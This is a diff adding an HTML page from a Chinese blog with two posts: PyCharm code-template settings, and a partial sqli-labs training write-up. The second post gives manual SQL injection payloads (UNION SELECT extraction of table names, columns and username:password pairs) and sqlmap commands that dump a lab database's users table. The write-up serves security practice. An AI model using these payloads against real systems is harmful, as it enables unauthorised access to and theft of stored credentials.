@@ -1,0 +1,2428 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://volantis.js.org/#2.6.6'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+      
+        <meta name="robots" content="noindex,follow">
+      
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+    <title>bansxf&#39;s blog</title>
+  
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+    
+      <meta name='theme-color' content='#FFFFFF'>
+    
+      <meta name='msapplication-TileColor' content='#1BC3FB'>
+    
+      <meta name='msapplication-config' content='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-favicon@19.9.6/browserconfig.xml'>
+    
+  
+
+  <!-- link -->
+  <script src="https://cdn.jsdelivr.net/npm/fg-loadcss@3.1.0/src/loadCSS.min.js"></script>
+  <script id="loadcss">
+    loadCSS( "https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css", document.getElementById("loadcss") );
+    loadCSS( "https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css", document.getElementById("loadcss") );
+	
+	loadCSS( "https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css", document.getElementById("loadcss") );
+    
+	
+	loadCSS( "https://cdn.jsdelivr.net/npm/aplayer@1.10/dist/APlayer.min.css", document.getElementById("loadcss") );
+    
+    
+	
+  </script>
+  
+  
+
+  <!-- import link -->
+  
+  
+  <link rel='shortcut icon' type='image/x-icon' href='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-favicon@19.9.6/favicon.ico'>
+  <link rel='icon' type='image/x-icon' sizes='32x32' href='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-favicon@19.9.6/favicon-32x32.png'>
+  <link rel='apple-touch-icon' type='image/png' sizes='180x180' href='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-favicon@19.9.6/apple-touch-icon.png'>
+  <link rel='mask-icon' color='#1BC3FB' href='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-favicon@19.9.6/safari-pinned-tab.svg'>
+  <link rel='manifest' href='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-favicon@19.9.6/site.webmanifest'>
+  
+
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  <script>
+    function setLoadingBarProgress(num) {
+      document.getElementById('loading-bar').style.width=num+"%";
+    }
+  </script>
+
+  
+  
+</head>
+
+<body>
+  
+  <div class="cover-wrapper">
+    
+      <cover class='cover  half'>
+        <div class='cover-body'>
+  <div class='a'>
+    
+    
+      <p class="title">bansxf</p>
+    
+    
+      <p class="subtitle">Welcome to my blog</p>
+    
+  </div>
+  <div class='b'>
+    
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <input type="text" class="input u-search-input" placeholder="" />
+          <i class="icon fas fa-search fa-fw"></i>
+        </form>
+      </div>
+    
+    <div class='menu navigation'>
+      <ul class='cover-list-h'>
+        
+          
+            <li>
+              <a class="nav home"
+                href="https://volantis.js.org/getting-started/"
+                
+                
+                id="https:volantisjsorggetting-started">
+                <i class='fas fa-book fa-fw'></i>文档
+              </a>
+            </li>
+          
+            <li>
+              <a class="nav home"
+                href="https://volantis.js.org/archives/"
+                
+                
+                id="https:volantisjsorgarchives">
+                <i class='fas fa-rss fa-fw'></i>博文
+              </a>
+            </li>
+          
+            <li>
+              <a class="nav home"
+                href="https://volantis.js.org/examples/"
+                
+                
+                id="https:volantisjsorgexamples">
+                <i class='fas fa-play-circle fa-fw'></i>示例
+              </a>
+            </li>
+          
+            <li>
+              <a class="nav home"
+                href="https://github.com/xaoxuu/hexo-theme-volantis/"
+                
+                  rel="external nofollow noopener noreferrer"
+                
+                
+                  target="_blank"
+                
+                id="https:githubcomxaoxuuhexo-theme-volantis">
+                <i class='fas fa-file-code fa-fw'></i>源码
+              </a>
+            </li>
+          
+            <li>
+              <a class="nav home"
+                href="https://volantis.js.org/contributors/"
+                
+                
+                id="https:volantisjsorgcontributors">
+                <i class='fas fa-handshake fa-fw'></i>鸣谢
+              </a>
+            </li>
+          
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+      </cover>
+    
+    <div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+<header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h'>
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+          
+            VOLANTIS <b><sup style='color:#3AA757'>2.6.6</sup></b>
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/categories/
+                  
+                  
+                  
+                    id="categories"
+                  >
+                  <i class='fas fa-folder-open fa-fw'></i>分类
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/categories/
+                  
+                  
+                  
+                    id="categories"
+                  >
+                  <i class='fas fa-folder-open fa-fw'></i>分类
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+<script>setLoadingBarProgress(40);</script>
+
+  </div>
+
+
+  <div class="l_body">
+    <div class='body-wrapper'>
+      
+
+<div class='l_main'>
+  
+  <section class="post-list ">
+    
+    
+      
+        
+          <div class='post-wrapper'>
+            <article class="post white-box shadow reveal ">
+  
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h2 class="title">
+    <a href="/categories/%E5%B7%A5%E5%85%B7/pycharm%E9%85%8D%E7%BD%AE/">
+      pycharm配置
+    </a>
+  </h2>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a href="https://xaoxuu.com" target="_blank" rel="nofollow noopener">
+    <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png">
+    <p>Mr. X</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  
+  <div class='new-meta-item category'>
+    <a href='/categories/%E5%B7%A5%E5%85%B7/' rel="nofollow">
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <p>工具</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Nov 9, 2019</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+  <section class="article typo">
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="pycharm自定义代码片段"><a href="#pycharm自定义代码片段" class="headerlink" title="pycharm自定义代码片段"></a>pycharm自定义代码片段</h2><h3 id="通用阶段"><a href="#通用阶段" class="headerlink" title="通用阶段"></a>通用阶段</h3><table>
+<thead>
+<tr>
+<th>变量</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>$end$</td>
+<td>表示光标中途停留的位置</td>
+</tr>
+<tr>
+<td>$ITERABLE$</td>
+<td>表示光标初始停留的位置</td>
+</tr>
+<tr>
+<td>$END$</td>
+<td>表示光标最后停留的位置（tab切换）</td>
+</tr>
+<tr>
+<td>$SELECTION$</td>
+<td>表示被选中的代码</td>
+</tr>
+<tr>
+<td>$class$</td>
+<td>表示当前所在类名</td>
+</tr>
+<tr>
+<td>$method$</td>
+<td>表示当前所在方法名</td>
+</tr>
+<tr>
+<td>$NAME$</td>
+<td>名称位置标记（自定义），初始光标停留。一般多个$NAME$，用于同时命名。</td>
+</tr>
+<tr>
+<td>$var$</td>
+<td>变量位置标记（自定义），初始光标停留。一般多个$var$，用于同时命名。</td>
+</tr>
+<tr>
+<td>$var1$</td>
+<td>变量1，tab切换时，光标会在该处停留</td>
+</tr>
+<tr>
+<td>$var2$</td>
+<td>变量2，tab切换时，光标会在该处停留</td>
+</tr>
+<tr>
+<td>$var3$</td>
+<td>变量3，tab切换时，光标会在该处停留</td>
+</tr>
+</tbody></table>
+<p>0、新建.py文件模板：</p>
+<p>Setting-》Editor-》File and Code Templates-》Files-》Python Script进入代码片段编辑界面。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line"># Created by $USER on $DATE</span><br><span class="line"></span><br><span class="line"># Copyright (c) $YEAR $USER. All rights reserved.</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line"></span><br><span class="line">  pass</span><br></pre></td></tr></table></figure>
+
+
+
+<p>从File-》Setting-》Editor-》Live Templates-》Python进入代码片段编辑界面 </p>
+<p>1 、哈希加密：sha1        描述：sha1 encode hexdigest</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from hashlib import sha1</span><br><span class="line"></span><br><span class="line">s &#x3D; sha1()</span><br><span class="line"></span><br><span class="line">s.update($password$.encode())</span><br><span class="line"></span><br><span class="line">$password$_sha1 &#x3D; s.hexdigest()</span><br></pre></td></tr></table></figure>
+
+<p>提示：$password$的默认值单独设置为”password”。</p>
+<p>2、处理异常：try         描述：try except finally</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line"></span><br><span class="line">  $pass$</span><br><span class="line"></span><br><span class="line">except Exception as e:</span><br><span class="line"></span><br><span class="line">  print(e)</span><br><span class="line"></span><br><span class="line">finally:</span><br><span class="line"></span><br><span class="line">  $clo$</span><br><span class="line"></span><br><span class="line">  pass</span><br><span class="line"></span><br><span class="line">$END$</span><br></pre></td></tr></table></figure>
+
+<p>提示：$pass$的默认值单独设置为”pass”；$clo的默认值设为”conn.close()”</p>
+<p>3、处理异常：tee        描述：try… except… else</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line"></span><br><span class="line">  $SELECTION$$END$</span><br><span class="line"></span><br><span class="line">except Exception as e:</span><br><span class="line"></span><br><span class="line">  print(e)</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line"></span><br><span class="line">   pass</span><br></pre></td></tr></table></figure>
+
+<p>提示：$SELECTION$表示被选中的代码。</p>
+<p>使用时，选中要放入try中的代码，再按ctrl+alt+T，选择tee。</p>
+<p>4、处理异常：tef         描述：try… except… finally</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line"></span><br><span class="line">  $SELECTION$$END$</span><br><span class="line"></span><br><span class="line">except Exception as e:</span><br><span class="line"></span><br><span class="line">  print(e)</span><br><span class="line"></span><br><span class="line">finally:</span><br><span class="line"></span><br><span class="line">   pass</span><br></pre></td></tr></table></figure>
+
+<p>提示：$SELECTION$表示被选中的代码。</p>
+<p>使用时，选中要放入try中的代码，再按ctrl+alt+T，选择tef。</p>
+<p>5、加双引号：str        描述：tostring</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;$SELECTION$&quot;</span><br></pre></td></tr></table></figure>
+
+<p>提示：$SELECTION$表示被选中的代码。</p>
+<p>使用时，选中要放入””双引号中的代码，再按ctrl+alt+T，选择str。</p>
+<p>6、返回真：rt         描述：return Ture</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return True$END$</span><br></pre></td></tr></table></figure>
+
+
+
+<p>7、返回假：rf         描述：return False</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return False$END$</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="django阶段"><a href="#django阶段" class="headerlink" title="django阶段"></a>django阶段</h3><p>8、渲染模板：reren          描述：return render()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">context&#x3D;&#123;$keyvalue$&#125;</span><br><span class="line"></span><br><span class="line">return render(request,&#39;$template$.html&#39;,context)</span><br></pre></td></tr></table></figure>
+
+<p>提示：顺序和初始值  $template$=”booktest/index”、 $keyvalue$</p>
+<p>9、准备数据：context          描述：context = {}</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">context&#x3D;&#123;</span><br><span class="line"></span><br><span class="line">  &#39;$uname$&#39;:$uname$,</span><br><span class="line"></span><br><span class="line">  &#39;$upwd$&#39;:$upwd$,</span><br><span class="line"></span><br><span class="line">  &#39;$var3$&#39;:$var3$,</span><br><span class="line"></span><br><span class="line">  &#39;$var4$&#39;:$var4$,</span><br><span class="line"></span><br><span class="line">  &#39;$var5$&#39;:$var5$,</span><br><span class="line"></span><br><span class="line">  &#39;$var6$&#39;:$var6$,</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>提示：初始值  $uname$=”uname”、  $upwd$=”upwd”</p>
+<p>10、准备数据：rehtt          描述：return HttpResponse()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return HttpResponse(&quot;$ok$&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>提示：初始值  $ok$=”ok”</p>
+<p>11、准备数据：rejson          描述：return JsonResponse()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return JsonResponse(&#123;&#39;$count$&#39;: $count$&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>提示：初始值  $count$=”count”</p>
+
+      
+    </div>
+    
+      
+    
+  </section>
+</article>
+
+          </div>
+        
+      
+        
+          <div class='post-wrapper'>
+            <article class="post white-box shadow reveal ">
+  
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h2 class="title">
+    <a href="/categories/%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">
+      sqli-labs靶场练习
+    </a>
+  </h2>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a href="https://xaoxuu.com" target="_blank" rel="nofollow noopener">
+    <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png">
+    <p>Mr. X</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  
+  <div class='new-meta-item category'>
+    <a href='/categories/%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/' rel="nofollow">
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <p>实战靶场</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Oct 13, 2019</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+  <section class="article typo">
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><blockquote>
+<p>参考：</p>
+<p><a href="https://www.cnblogs.com/carlos-mm/p/8388351.html" target="_blank" rel="noopener">https://www.cnblogs.com/carlos-mm/p/8388351.html</a></p>
+</blockquote>
+<p>下载地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p>
+<p>安装平台：windows</p>
+<p>环境配置：phpstudy集成，注：php版本要7以下 ，因为sqli-labs是很多年前的了，那个时候的php版本是5 。</p>
+<p>安装步骤：将下载的文件解压发在phpstudy的WWW文件夹下，修改</p>
+<p><code>sqli-labs/sql-connections/db-creds.inc</code>内的账号密码，打开sqli的网页，点击<code>Setup/reset Database for labs</code>安装。</p>
+<h2 id="演练"><a href="#演练" class="headerlink" title="演练"></a>演练</h2><blockquote>
+<p>参考</p>
+<p> <a href="https://blog.csdn.net/qq_41420747/article/details/81836327" target="_blank" rel="noopener">https://blog.csdn.net/qq_41420747/article/details/81836327</a> </p>
+</blockquote>
+<blockquote>
+<p>order by 排序，数值时，某列；字符时，字段名；不存在该列时，报错。</p>
+<p>union 合并多个select语句的结果集</p>
+<p>CONCAT()函数用于将多个字符串连接成一个字符串</p>
+<p>rand()函数，随机0-1之间的数</p>
+<p>floor()去掉小数。floor(min + rand() * (max - min)) </p>
+<p>limit 5 等价于limit 0,5 检索1-5,前五行</p>
+<p>left(被截取字符串， 截取长度)</p>
+</blockquote>
+<h3 id="Less-1-get字符型报错注入"><a href="#Less-1-get字符型报错注入" class="headerlink" title="Less-1 get字符型报错注入"></a>Less-1 get字符型报错注入</h3><blockquote>
+<p>手工注入</p>
+</blockquote>
+<p>找注入点</p>
+<p>id处存在注入点，修改id的值，页面发生改变。</p>
+<p>判断id的值类型</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;2&#39;</span><br><span class="line">报错信息：...near &#39;&#39;2&#39;&#39; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>根据报错提示，判断出闭合条件为单引号</p>
+<p>成功闭合</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;2&#39; --+</span><br></pre></td></tr></table></figure>
+
+<p>判断字段数为三个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;2&#39; order by 3 --+</span><br></pre></td></tr></table></figure>
+
+<p>爆出数据库名（<a href="https://www.runoob.com/sql/sql-union.html" target="_blank" rel="noopener">union操作符</a>）<br>union 合并多个select语句的结果集，此处id=0无结果，才会显示后面我们自己的结果。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; union select 1,database(),version() --+</span><br></pre></td></tr></table></figure>
+
+<p>爆出表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() --+</span><br></pre></td></tr></table></figure>
+
+<p>查看表单名，挑选其中的users，爆字段名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot; --+</span><br></pre></td></tr></table></figure>
+
+<p>根据爆出的字段名，挑选username和password,爆出值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; union select 1,database(),group_concat(username,0x3a,password) from security.users --+</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>sqlmap注入</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;10.1.136.159&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --current-db --batch</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;10.1.136.159&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D &quot;security&quot; --tables --batch</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;10.1.136.159&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D &quot;security&quot; -T users --columns --batch</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;10.1.136.159&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D &quot;security&quot; -T users -C username,password --dump --batch</span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-2-get整形报错注入"><a href="#Less-2-get整形报错注入" class="headerlink" title="Less-2 get整形报错注入"></a>Less-2 get整形报错注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;</span><br><span class="line">报错为：near &#39;&#39; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>成功闭合</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 --+</span><br></pre></td></tr></table></figure>
+
+<p>之后爆X同上</p>
+<h3 id="Less-3-get字符型报错注入"><a href="#Less-3-get字符型报错注入" class="headerlink" title="Less-3 get字符型报错注入"></a>Less-3 get字符型报错注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">报错为：near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;) --+</span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-4-get字符型报错注入"><a href="#Less-4-get字符型报错注入" class="headerlink" title="Less-4 get字符型报错注入"></a>Less-4 get字符型报错注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot;</span><br><span class="line">报错为：near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot;) --+</span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-5-get字符型双注入"><a href="#Less-5-get字符型双注入" class="headerlink" title="Less-5 get字符型双注入"></a>Less-5 get字符型双注入</h3><p>构造双查询，比如派生表，使一个报错，另一个的结果就会出现在报错的信息中。 </p>
+<p> CONCAT()函数用于将多个字符串连接成一个字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(&#39;李&#39;,&#39;哈哈&#39;);</span><br></pre></td></tr></table></figure>
+
+<p> rand()函数，随机0-1之间的数 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rand();</span><br></pre></td></tr></table></figure>
+
+<p> 获得0-2之间的整数（包含0，不包含2）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rand()*10;</span><br></pre></td></tr></table></figure>
+
+<p>   floor()去掉小数。  获得指定区间的数字(比如：5-10之间) </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select floor(5+rand()*5);</span><br></pre></td></tr></table></figure>
+
+<p> 公式：floor(min + rand() * (max - min)) </p>
+<p>limit 从0开始</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">limit 5,10 检索6-15</span><br><span class="line">limit 95,-1 检索95-尾</span><br><span class="line">limit 5 等价于limit 0,5 检索1-5,前五行</span><br></pre></td></tr></table></figure>
+
+<p>as  可理解为：用作、当成，作为；一般是重命名列名或者表名。（主要为了查询方便）</p>
+<p>group by 查询结果进行分组统计，最终得到一个分组汇总表(每个组各返回一个结果)</p>
